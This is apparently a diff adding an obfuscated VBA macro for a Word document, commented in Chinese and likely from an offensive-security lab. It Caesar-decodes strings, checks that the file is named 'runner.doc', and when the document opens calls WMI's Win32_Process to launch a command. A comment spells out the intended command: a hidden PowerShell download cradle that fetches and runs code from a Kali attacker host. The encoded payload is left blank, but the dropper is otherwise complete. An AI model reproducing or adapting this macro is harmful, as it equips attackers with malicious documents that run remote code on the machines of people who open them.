@@ -1,0 +1,45 @@
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+ 
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+ 
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+ 
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+ 
+Function MyMacro()
+    Dim Apples As String
+    Dim Water As String
+    
+    ' 利用 PowerShell 脚本加密 Word 文件名 : $payload = "runner.doc"
+    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
+        Exit Function
+    End If
+    
+    ' $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://My-Kali-IP/run64.txt'))"
+    Apples = ""
+    
+    Water = Nuts(Apples)
+    
+    ' $payload = "winmgmts:" 以及 $payload = "Win32_Process", 这里的加密字符串在不修改凯撒加密密钥的情况下是固定的
+    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+End Function
+ 
+Sub Document_Open()
+    MyMacro
+End Sub
+ 
+Sub AutoOpen()
+    MyMacro
+End Sub
